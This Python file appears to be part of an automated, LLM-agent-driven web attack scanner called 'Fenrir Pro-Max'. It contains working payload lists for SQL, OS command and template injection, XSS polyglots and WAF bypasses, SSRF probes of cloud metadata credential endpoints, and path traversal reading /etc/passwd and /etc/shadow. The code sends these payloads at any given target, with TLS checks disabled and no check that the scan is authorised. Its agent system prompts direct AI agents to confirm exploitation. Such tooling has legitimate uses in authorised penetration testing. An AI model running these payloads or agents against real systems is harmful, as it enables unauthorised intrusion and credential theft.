"""Vulnerability analysis agents: injection testing, XSS, auth, authz, SSRF, misconfiguration, file attacks."""

from __future__ import annotations

import re
from datetime import datetime
from typing import Any

from loguru import logger

from fenrir.agents.base import AgentResult, BaseAgent
from fenrir.config import LLMTier


class HTTPTestClient:
    """Simple HTTP client for vulnerability testing."""

    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip("/")
        self.session_cookies = {}

    def _make_url(self, path: str) -> str:
        if path.startswith("http"):
            return path
        return f"{self.base_url}{path}"

    def get(self, path: str, params: dict[str, str] | None = None,
            headers: dict[str, str] | None = None) -> dict[str, Any]:
        import urllib.request
        import urllib.parse
        import ssl
        try:
            url = self._make_url(path)
            if params:
                url += "?" + urllib.parse.urlencode(params)

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            req = urllib.request.Request(url, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                **(headers or {}),
            })

            # Add session cookies
            if self.session_cookies:
                cookie_str = "; ".join(f"{k}={v}" for k, v in self.session_cookies.items())
                req.add_header("Cookie", cookie_str)

            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            status = resp.status
            body = resp.read().decode("utf-8", errors="ignore")
            resp_headers = dict(resp.headers)

            # Save cookies
            if "Set-Cookie" in resp_headers:
                for c in resp_headers.get("Set-Cookie", "").split(","):
                    if "=" in c:
                        name, val = c.split("=", 1)
                        self.session_cookies[name.strip()] = val.split(";")[0].strip()

            return {"status": status, "body": body, "headers": resp_headers}
        except Exception as e:
            return {"error": str(e)}

    def post(self, path: str, data: dict[str, str] | None = None,
             headers: dict[str, str] | None = None) -> dict[str, Any]:
        import urllib.request
        import urllib.parse
        import ssl
        try:
            url = self._make_url(path)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            req = urllib.request.Request(
                url, method="POST", data=urllib.parse.urlencode(data or {}).encode(),
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Content-Type": "application/x-www-form-urlencoded",
                    **(headers or {}),
                }
            )

            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            return {
                "status": resp.status,
                "body": resp.read().decode("utf-8", errors="ignore"),
                "headers": dict(resp.headers),
            }
        except Exception as e:
            return {"error": str(e)}


class SQLInjector:
    """SQL injection testing logic."""

    COMMON_PAYLOADS = [
        "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --",
        "admin'--", "admin' #", "' UNION SELECT NULL --",
        "' UNION SELECT 1,2,3 --", "' OR ''='", "1' ORDER BY 1--",
        "1' ORDER BY 10--", "1' ORDER BY 100--",
        "1' AND 1=1--", "1' AND 1=2--",
        "' AND SLEEP(5)--", "1; SELECT SLEEP(5)--",
        "1' WAITFOR DELAY '0:0:5'--",
    ]

    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL result",
        r"PostgreSQL.*ERROR", r"Warning.*pg_", r"org\.postgresql",
        r"Oracle.*error", r"ORA-\d{5}", r"Microsoft.*JET.*Engine",
        r"ODBC SQL Server", r"SqlException", r"Sintax error",
        r"Unclosed quotation mark", r"SQLState", r"SQLite3::SQLException",
        r"sqlite.*error", r"unexpected end of SQL",
        r"com\.microsoft\.sqlserver", r"You have an error.*SQL syntax",
    ]

    def test_url(self, client: HTTPTestClient, url: str, param_name: str) -> list[dict[str, Any]]:
        """Test a URL parameter for SQL injection."""
        findings = []

        # Error-based detection
        for payload in self.COMMON_PAYLOADS[:10]:  # Quick test
            try:
                result = client.get(url, params={param_name: payload})
                if "error" in result:
                    continue

                body = result.get("body", "")
                for pattern in self.ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        finding = {
                            "type": "sql_injection",
                            "subtype": "error_based",
                            "url": url,
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": f"SQL error pattern matched: {pattern}",
                        }
                        findings.append(finding)
                        break
            except Exception:
                pass

        return findings


class CommandInjector:
    """Command injection testing logic."""

    PAYLOADS = [
        "; id", "| id", "`id`", "$(id)",
        "; whoami", "| whoami", "`whoami`",
        "; ls -la", "| cat /etc/passwd",
        "1; sleep 5", "1| sleep 5", "1$sleep 5",
        "| nslookup", "`nslookup`",
    ]

    INDICATORS = [
        "uid=", "gid=", "root:", "nobody:",
        "total ", "drwx", "root:x:0:0",
        "Non-authoritative", "Name:",
    ]

    def test_url(self, client: HTTPTestClient, url: str, param_name: str) -> list[dict[str, Any]]:
        findings = []

        for payload in self.PAYLOADS:
            try:
                result = client.get(url, params={param_name: payload})
                if "error" in result:
                    continue

                body = result.get("body", "")
                for indicator in self.INDICATORS:
                    if indicator.lower() in body.lower():
                        findings.append({
                            "type": "command_injection",
                            "subtype": "blind_or_direct",
                            "url": url,
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": f"OS command response indicator found: {indicator}",
                        })
                        break
            except Exception:
                pass

        return findings


class SSTIDetector:
    """Server-Side Template Injection testing."""

    PAYLOADS = [
        "{{7*7}}", "${7*7}", "#{7*7}",
        "{{self}}", "${{7*7}}",
        "{% for a in [].__class__.__base__.__subclasses__() %}{% endfor %}",
        "${T(java.lang.Runtime).getRuntime()}",
        "{{''.__class__.__mro__[-1].__subclasses__()}}",
        "${{config}}", "#{applicationContext}",
    ]

    def test_url(self, client: HTTPTestClient, url: str, param_name: str) -> list[dict[str, Any]]:
        findings = []

        # First get baseline
        baseline = client.get(url, params={param_name: "fenrir_test_marker"})
        baseline_body = baseline.get("body", "") if "error" not in baseline else ""

        for payload in self.PAYLOADS:
            try:
                result = client.get(url, params={param_name: payload})
                if "error" in result:
                    continue

                body = result.get("body", "")

                # Check if 49 (7*7) appears and wasn't in baseline
                if "49" in body and "49" not in baseline_body:
                    findings.append({
                        "type": "ssti",
                        "subtype": "math_eval",
                        "url": url,
                        "parameter": param_name,
                        "payload": payload,
                        "evidence": f"Template injection evaluated: 7*7=49 found in response",
                    })

                # Check for framework leaks
                if "self" in body.lower() and "{{self}}" in payload:
                    findings.append({
                        "type": "ssti",
                        "subtype": "object_leak",
                        "url": url,
                        "parameter": param_name,
                        "payload": payload,
                        "evidence": "Template self object leaked in response",
                    })

            except Exception:
                pass

        return findings


class InjectionAgent(BaseAgent):
    """SQL injection, command injection, and SSTI testing agent."""

    name = "injection"
    role = "injection_testing"
    system_prompt = """You are Fenrir Pro-Max's Injection Testing Agent.

Test target for:
1. SQL Injection (Error-based, Blind, Union-based, Time-based)
2. OS Command Injection (Direct and Blind)
3. Server-Side Template Injection (Jinja2, Twig, FreeMarker, Thymeleaf)
4. LDAP Injection
5. NoSQL Injection (MongoDB, CouchDB)

Methodology:
1. Identify injection points from recon data (URL params, form inputs, JSON body)
2. Determine the injection context (string, numeric, operator-based)
3. Test with detection payloads (fingerprinting)
4. Confirm with proof-of-concept payloads
5. Document exploitation path"""
    tier = LLMTier.TIER_1

    async def _run(self, task: str, context: str) -> AgentResult:
        target = self.target or task.strip().split()[-1]
        findings = []

        if not target.startswith(("http://", "https://")):
            target = f"http://{target}"

        client = HTTPTestClient(target)

        # URLs to test with common injection parameters
        test_urls = [
            "/api/users", "/api/users/{id}", "/search",
            "/login", "/register", "/profile",
            "/products", "/products/{id}", "/items",
            "/api/v1/users", "/api/v1/products",
            "/api/data", "/api/query", "/fetch",
        ]

        test_params = ["id", "user_id", "q", "query", "search", "name", "page", "sort", "order"]

        # SQL Injection testing
        sqli = SQLInjector()
        for url in test_urls:
            for param in test_params:
                try:
                    vulns = sqli.test_url(client, url, param)
                    findings.extend(vulns)
                except Exception as e:
                    logger.debug(f"Sqli test failed for {url}?{param}={e}")

        # Command Injection testing
        cmdi = CommandInjector()
        for url in test_urls:
            for param in test_params:
                try:
                    vulns = cmdi.test_url(client, url, param)
                    findings.extend(vulns)
                except Exception as e:
                    logger.debug(f"Cmdi test failed for {url}?{param}={e}")

        # SSTI testing
        ssti = SSTIDetector()
        for url in test_urls:
            for param in test_params:
                try:
                    vulns = ssti.test_url(client, url, param)
                    findings.extend(vulns)
                except Exception as e:
                    logger.debug(f"SSTI test failed for {url}?{param}={e}")

        # Save confirmed findings
        for f in findings:
            self.save_finding(f, "vuln")

        return AgentResult(
            agent_name=self.name,
            success=True,
            summary=f"Injection testing complete: {len(findings)} potential findings",
            findings=findings,
        )


class XSSAgent(BaseAgent):
    """Cross-Site Scripting testing agent."""

    name = "xss"
    role = "xss_testing"
    system_prompt = """You are Fenrir Pro-Max's XSS Testing Agent.

Test for:
1. Reflected XSS
2. Stored XSS
3. DOM-based XSS
4. mXSS (Mutation XSS)

Payload categories:
- Basic: <script>alert(1)</script>
- Event handlers: <img src=x onerror=alert(1)>
- Polyglots: Test multiple contexts simultaneously
- WAF bypass: Encoded, obfuscated, and alternative syntax payloads
- Context-aware: Different payloads for HTML, attribute, JS, and URL contexts

Always document the exact injection point, context, and working payload."""
    tier = LLMTier.TIER_1

    XSS_PAYLOADS = [
        # Basic
        '<script>alert(1)</script>',
        '<script>document.cookie</script>',
        # Event handlers
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        # Polyglot
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
        # Encoded
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        # Attribute context
        '" onmouseover="alert(1)" x="',
        '\' onfocus="alert(1)" x=\'',
        # JS context
        '</script><script>alert(1)</script>',
        # DOM-based
        '"><img src=x onerror=alert(document.domain)>',
        'javascript:alert(1)',
        # WAF bypass attempts
        '<sCrIpT>alert(1)</ScRiPt>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
    ]

    XSS_INDICATORS = [
        "<script>alert(1)</script>",
        "alert(1)",
        "onerror=alert",
        "onload=alert",
        "onmouseover=alert",
        "<svg",
        "<img src=x",
        "javascript:",
    ]

    async def _run(self, task: str, context: str) -> AgentResult:
        target = self.target or task.strip().split()[-1]
        findings = []

        if not target.startswith(("http://", "https://")):
            target = f"http://{target}"

        client = HTTPTestClient(target)

        test_urls = [
            "/search", "/api/search", "/find", "/query",
            "/login", "/register", "/feedback", "/contact",
            "/profile", "/settings", "/update",
            "/comment", "/post", "/review",
            "<script>alert(1)</script>",  # placeholder - replaced by test
        ]

        test_params = ["q", "query", "search", "name", "comment", "message", "input", "text"]

        # Test each URL/param combination
        for param in test_params:
            for url in test_urls[:12]:  # Skip placeholder
                # Reflected XSS test
                for payload in self.XSS_PAYLOADS[:10]:  # Quick test first
                    try:
                        result = client.get(url, params={param: payload})
                        if "error" in result:
                            continue

                        body = result.get("body", "")
                        if payload.lower() in body.lower():
                            # Check if the payload is executable (not encoded/escaped)
                            is_reflected = True
                            for indicator in self.XSS_INDICATORS:
                                if indicator.lower() in body.lower():
                                    vuln_type = "reflected_xss"
                                    if "script>" in indicator:
                                        subtype = "html_injection"
                                    elif "onerror" in indicator or "onload" in indicator:
                                        subtype = "event_handler_injection"
                                    else:
                                        subtype = "context_dependent"

                                    findings.append({
                                        "type": "xss",
                                        "vuln_type": vuln_type,
                                        "subtype": subtype,
                                        "url": url,
                                        "parameter": param,
                                        "payload": payload,
                                        "evidence": f"Payload reflected: {payload[:50]}",
                                        "confirmed": True,
                                    })
                                    break

                    except Exception:
                        pass

        # Save findings
        for f in findings:
            self.save_finding(f, "vuln")

        return AgentResult(
            agent_name=self.name,
            success=True,
            summary=f"XSS testing complete: {len(findings)} potential findings",
            findings=findings,
        )


class AuthAgent(BaseAgent):
    """Authentication flaw testing agent."""

    name = "auth"
    role = "authentication_testing"
    system_prompt = """You are Fenrir Pro-Max's Authentication Testing Agent.

Test for:
1. Brute force vulnerability (no rate limiting)
2. Default credentials
3. Password reset flaws
4. JWT vulnerabilities (none alg, weak secrets, algorithm confusion)
5. OAuth flow vulnerabilities
6. Session management issues (fixation, predictable tokens)
7. 2FA bypass techniques

Focus on authentication flow analysis rather than raw brute force."""
    tier = LLMTier.TIER_1

    async def _run(self, task: str, context: str) -> AgentResult:
        target = self.target or task.strip().split()[-1]
        findings = []

        if not target.startswith(("http://", "https://")):
            target = f"http://{target}"

        client = HTTPTestClient(target)

        # Test common auth endpoints
        auth_endpoints = [
            ("/login", "POST"), ("/auth", "POST"), ("/api/auth/login", "POST"),
            ("/signin", "POST"), ("/api/login", "POST"),
        ]

        for endpoint, method in auth_endpoints:
            try:
                # Check if endpoint exists
                result = client.get(endpoint)
                if "error" not in result and result.get("status") in (200, 302, 405):
                    findings.append({
                        "type": "auth_endpoint",
                        "endpoint": endpoint,
                        "status": result.get("status"),
                        "headers": {k: v for k, v in result.get("headers", {}).items()
                                   if k.lower() in ("set-cookie", "www-authenticate", "x-powered-by")},
                    })

                    # Test for rate limiting
                    if method == "POST":
                        failed_attempts = 0
                        for i in range(5):
                            resp = client.post(endpoint, data={
                                "username": f"test_user_{i}",
                                "password": f"test_pass_{i}",
                            })
                            if "error" not in resp:
                                failed_attempts += 1
                                status = resp.get("status")
                                if status == 429:
                                    findings.append({
                                        "type": "rate_limiting",
                                        "endpoint": endpoint,
                                        "status": "present",
                                        "trigger_attempts": i + 1,
                                    })
                                    break

                        if failed_attempts == 5:
                            findings.append({
                                "type": "rate_limiting",
                                "endpoint": endpoint,
                                "status": "absent",
                                "detail": "No rate limiting detected after 5 failed attempts",
                            })
            except Exception:
                pass

        # Check for common default credentials
        common_logins = [
            "/admin", "/dashboard", "/cpanel", "/wp-admin",
            "/login", "/administrator", "/manager/html",
        ]

        for path in common_logins:
            try:
                result = client.get(path)
                if "error" not in result and result.get("status") == 200:
                    findings.append({
                        "type": "admin_panel",
                        "endpoint": path,
                        "status": 200,
                        "detail": "Admin/login panel accessible",
                    })
            except Exception:
                pass

        # Save findings
        for f in findings:
            self.save_finding(f, "vuln")

        return AgentResult(
            agent_name=self.name,
            success=True,
            summary=f"Auth testing complete: {len(findings)} findings",
            findings=findings,
        )


class AuthzAgent(BaseAgent):
    """Authorization testing agent (IDOR, privilege escalation)."""

    name = "authz"
    role = "authorization_testing"
    system_prompt = """You are Fenrir Pro-Max's Authorization Testing Agent.

Test for:
1. IDOR (Insecure Direct Object Reference) - accessing other users' data via ID manipulation
2. Horizontal privilege escalation - accessing peer-level resources
3. Vertical privilege escalation - accessing admin-level resources
4. Missing function-level access control
5. Insecure multi-step workflows

Strategy:
- Identify parameters that reference user-specific resources (IDs, usernames)
- Test parameter tampering with different IDs
- Check if access controls are enforced at the API level, not just UI level"""
    tier = LLMTier.TIER_1

    async def _run(self, task: str, context: str) -> AgentResult:
        target = self.target or task.strip().split()[-1]
        findings = []

        if not target.startswith(("http://", "https://")):
            target = f"http://{target}"

        client = HTTPTestClient(target)

        # Test IDOR-prone patterns
        idor_patterns = [
            "/api/users/{id}", "/api/users/{id}/profile",
            "/api/users/{id}/settings", "/api/account/{id}",
            "/api/orders/{id}", "/api/documents/{id}",
            "/api/files/{id}", "/api/data/{id}",
            "/user/profile?id={id}", "/profile?userId={id}",
            "/api/v1/users/{id}", "/api/v2/users/{id}",
        ]

        # Test with sequential IDs
        for pattern in idor_patterns:
            for test_id in [1, 2, 100, 999, 1000, 9999]:
                test_url = pattern.replace("{id}", str(test_id))
                try:
                    result = client.get(test_url)
                    if "error" not in result:
                        status = result.get("status", 0)
                        body = result.get("body", "")

                        # If we get 200 and meaningful content, it might be IDOR
                        if status == 200 and len(body) > 50:
                            # Check for user data patterns
                            user_indicators = ["email", "username", "password", "token", "secret", "name"]
                            data_found = any(ind in body.lower() for ind in user_indicators)

                            if data_found and test_id > 1:
                                findings.append({
                                    "type": "idor_potential",
                                    "url": test_url,
                                    "parameter": "id",
                                    "test_values": [1, test_id],
                                    "evidence": f"Accessible with ID {test_id}, contains user data indicators",
                                    "severity": "high",
                                })
                except Exception:
                    pass

        # Save findings
        for f in findings:
            self.save_finding(f, "vuln")

        return AgentResult(
            agent_name=self.name,
            success=True,
            summary=f"AuthZ testing complete: {len(findings)} potential IDOR findings",
            findings=findings,
        )


class SSRFAgent(BaseAgent):
    """Server-Side Request Forgery testing agent."""

    name = "ssrf"
    role = "ssrf_testing"
    system_prompt = """You are Fenrir Pro-Max's SSRF Testing Agent.

Test for Server-Side Request Forgery by:
1. Identifying parameters that accept URLs or hostnames
2. Testing with internal IP ranges (127.0.0.1, 10.0.0.0/8, etc.)
3. Testing with cloud metadata endpoints (169.254.169.254)
4. Using URL encoding and alternate schemes (gopher, dict, file)
5. Testing blind SSRF with callbacks to known endpoints

SSRF targets: webhook URLs, image fetchers, PDF generators, URL previewers,
import/export features, file upload from URL, etc."""
    tier = LLMTier.TIER_1

    SSRF_PAYLOADS = [
        "http://127.0.0.1", "http://127.0.0.1:8080",
        "http://localhost", "http://localhost:8080",
        "http://0.0.0.0", "http://[::1]",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://10.0.0.1", "http://10.0.0.2",
        "http://192.168.1.1", "http://172.16.0.1",
        # Encoding bypasses
        "http://127.0.0.1%2F", "http://0x7f000001",
        "http://[0:0:0:0:0:ffff:127.0.0.1]",
        "http://2130706433",  # 127.0.0.1 as integer
    ]

    async def _run(self, task: str, context: str) -> AgentResult:
        target = self.target or task.strip().split()[-1]
        findings = []

        if not target.startswith(("http://", "https://")):
            target = f"http://{target}"

        client = HTTPTestClient(target)

        # Parameters that often accept URLs
        url_params = ["url", "dest", "redirect", "callback", "webhook",
                      "image", "file", "path", "return", "next",
                      "load", "fetch", "proxy", "source", "data",
                      "import", "export"]

        # Common SSRF-prone endpoints
        ssrf_endpoints = [
            "/api/webhook", "/api/fetch", "/api/proxy",
            "/api/import", "/api/export", "/api/preview",
            "/api/url", "/api/load", "/api/download",
            "/api/scan", "/api/check", "/api/refresh",
            "/api/oauth/callback", "/api/sso/callback",
        ]

        for endpoint in ssrf_endpoints:
            for param in url_params:
                for payload in self.SSRF_PAYLOADS[:6]:  # Quick test
                    try:
                        result = client.get(endpoint, params={param: payload})
                        if "error" in result:
                            continue

                        body = result.get("body", "")
                        status = result.get("status", 0)

                        # Check for internal service responses
                        internal_indicators = [
                            "metadata.google.internal",
                            "ami-id", "instance-id",
                            "local-ipv4", "public-ipv4",
                            "EC2", "AWS",
                        ]
                        for indicator in internal_indicators:
                            if indicator.lower() in body.lower():
                                findings.append({
                                    "type": "ssrf",
                                    "subtype": "cloud_metadata",
                                    "url": endpoint,
                                    "parameter": param,
                                    "payload": payload,
                                    "evidence": f"Internal service data found: {indicator}",
                                    "severity": "critical",
                                })
                                break
                    except Exception:
                        pass

        # Save findings
        for f in findings:
            self.save_finding(f, "vuln")

        return AgentResult(
            agent_name=self.name,
            success=True,
            summary=f"SSRF testing complete: {len(findings)} findings",
            findings=findings,
        )


class MisconfigAgent(BaseAgent):
    """Security misconfiguration testing agent."""

    name = "misconfig"
    role = "misconfiguration_testing"
    system_prompt = """You are Fenrir Pro-Max's Misconfiguration Testing Agent.

Test for:
1. Missing security headers (CSP, HSTS, X-Frame-Options, etc.)
2. CORS misconfiguration (wildcard origin, credentials)
3. Verbose error messages / stack traces
4. Directory listing enabled
5. Default credentials and pages
6. Information disclosure via headers
7. Exposed configuration files (.env, .git, etc.)
8. HTTP methods misconfiguration (TRACE, OPTIONS, etc.)"""
    tier = LLMTier.TIER_1

    SENSITIVE_FILES = [
        "/.env", "/.git/config", "/.git/HEAD", "/.svn/entries",
        "/wp-config.php", "/config.php", "/config.json", "/config.yaml",
        "/.htaccess", "/web.config", "/docker-compose.yml",
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/server-status", "/server-info",
        "/api-docs", "/swagger.json", "/swagger-ui.html",
        "/graphql", "/graphiql", "/.well-known/security.txt",
        "/actuator/health", "/actuator/env", "/actuator/beans",
        "/debug/vars", "/metrics", "/health",
    ]

    async def _run(self, task: str, context: str) -> AgentResult:
        target = self.target or task.strip().split()[-1]
        findings = []

        if not target.startswith(("http://", "https://")):
            target = f"http://{target}"

        client = HTTPTestClient(target)

        # Check sensitive files
        for path in self.SENSITIVE_FILES:
            try:
                result = client.get(path)
                if "error" in result:
                    continue

                status = result.get("status", 0)
                body = result.get("body", "")

                if status == 200 and len(body) > 20:
                    severity = "medium"
                    if any(f in path for f in [".env", ".git", "wp-config", "config.php"]):
                        severity = "critical"
                    elif any(f in path for f in ["actuator", "debug", "server-status"]):
                        severity = "high"
                    elif any(f in path for f in ["swagger", "graphql", "api-docs"]):
                        severity = "medium"

                    findings.append({
                        "type": "information_disclosure",
                        "subtype": "sensitive_file",
                        "url": path,
                        "status": status,
                        "content_length": len(body),
                        "preview": body[:500],
                        "severity": severity,
                    })
            except Exception:
                pass

        # Test HTTP methods
        methods = ["TRACE", "DELETE", "PUT", "PATCH", "OPTIONS"]
        for method in methods:
            try:
                result = client.get("/", headers={"Method-Test": method})
                if "error" not in result:
                    status = result.get("status", 0)
                    if method == "OPTIONS":
                        allowed = result.get("headers", {}).get("Allow", "")
                        if allowed:
                            findings.append({
                                "type": "http_method_disclosure",
                                "detail": f"Allowed methods: {allowed}",
                            })
            except Exception:
                pass

        # Check for verbose errors
        error_paths = ["/nonexistent_path_12345", "/api/v1/undefined", "/<invalid>"]
        for path in error_paths:
            try:
                result = client.get(path)
                if "error" not in result:
                    body = result.get("body", "")
                    if any(ind in body.lower() for ind in [
                        "stack trace", "traceback", "error detail",
                        "exception", "at line ", "at file ",
                        "org.springframework", "php fatal error",
                        "django.core.exceptions", "node:internal"
                    ]):
                        findings.append({
                            "type": "information_disclosure",
                            "subtype": "verbose_error",
                            "url": path,
                            "status": result.get("status"),
                            "evidence": body[:500],
                            "severity": "medium",
                        })
            except Exception:
                pass

        # Save findings
        for f in findings:
            self.save_finding(f, "vuln")

        return AgentResult(
            agent_name=self.name,
            success=True,
            summary=f"Misconfiguration testing complete: {len(findings)} findings",
            findings=findings,
        )


class FileAttackAgent(BaseAgent):
    """Path traversal, LFI/RFI, file upload attacks."""

    name = "file_attack"
    role = "file_based_attacks"
    system_prompt = """You are Fenrir Pro-Max's File Attack Agent.

Test for:
1. Directory/Path Traversal (../../etc/passwd)
2. Local File Inclusion (LFI)
3. Remote File Inclusion (RFI)
4. Arbitrary file upload
5. Null byte injection (%00)
6. Double encoding bypasses
7. Zip slip attacks

Always test with both Linux and Windows paths."""
    tier = LLMTier.TIER_1

    TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd", "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",  # double encoding
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..;;/..;/..;/etc/passwd",
        "/etc/passwd%00.png",
        "..%00/etc/passwd",
    ]

    SENSITIVE_FILES = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "C:\\Windows\\win.ini", "C:\\boot.ini",
        "/proc/self/environ", "/proc/version",
    ]

    async def _run(self, task: str, context: str) -> AgentResult:
        target = self.target or task.strip().split()[-1]
        findings = []

        if not target.startswith(("http://", "https://")):
            target = f"http://{target}"

        client = HTTPTestClient(target)

        # Parameters commonly used for file operations
        file_params = ["file", "path", "page", "dir", "document",
                       "folder", "root", "pg", "style", "pdf",
                       "template", "php_path", "view", "include",
                       "load", "open", "download", "img", "src"]

        file_endpoints = [
            "/download", "/include", "/page", "/view",
            "/load", "/file", "/render", "/template",
            "/image", "/getfile", "/stream",
            "/api/file", "/api/download", "/api/upload",
        ]

        # Test traversal in parameters
        for param in file_params:
            for payload in self.TRAVERSAL_PAYLOADS:
                for endpoint in file_endpoints[:6]:
                    try:
                        result = client.get(endpoint, params={param: payload})
                        if "error" in result:
                            continue

                        body = result.get("body", "")
                        # Check for /etc/passwd patterns
                        if "root:" in body and "nologin" in body:
                            findings.append({
                                "type": "lfi",
                                "subtype": "path_traversal",
                                "url": endpoint,
                                "parameter": param,
                                "payload": payload,
                                "evidence": "etc/passwd contents detected",
                                "severity": "critical",
                            })
                        elif "[extensions]" in body or "[fonts]" in body:
                            findings.append({
                                "type": "lfi",
                                "subtype": "path_traversal",
                                "url": endpoint,
                                "parameter": param,
                                "payload": payload,
                                "evidence": "Windows win.ini contents detected",
                                "severity": "critical",
                            })
                    except Exception:
                        pass

        # Check for upload functionality
        upload_paths = ["/upload", "/api/upload", "/file/upload", "/files"]
        for path in upload_paths:
            try:
                result = client.get(path)
                if "error" not in result and result.get("status") == 200:
                    body = result.get("body", "")
                    if "upload" in body.lower() and "file" in body.lower():
                        findings.append({
                            "type": "upload_endpoint",
                            "url": path,
                            "detail": "File upload functionality detected",
                        })
            except Exception:
                pass

        # Save findings
        for f in findings:
            self.save_finding(f, "vuln")

        return AgentResult(
            agent_name=self.name,
            success=True,
            summary=f"File attack testing complete: {len(findings)} findings",
            findings=findings,
        )
